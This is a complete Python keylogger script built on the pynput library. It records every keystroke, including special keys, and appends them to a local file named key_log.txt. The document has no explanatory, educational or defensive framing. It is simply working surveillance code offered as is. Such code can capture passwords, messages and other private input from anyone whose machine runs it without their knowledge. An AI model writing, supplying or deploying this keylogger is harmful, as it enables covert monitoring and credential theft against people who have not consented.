from pynput import keyboard

def on_press(key):
    try:
        with open("key_log.txt", "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open("key_log.txt", "a") as log:
            log.write(f"{key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
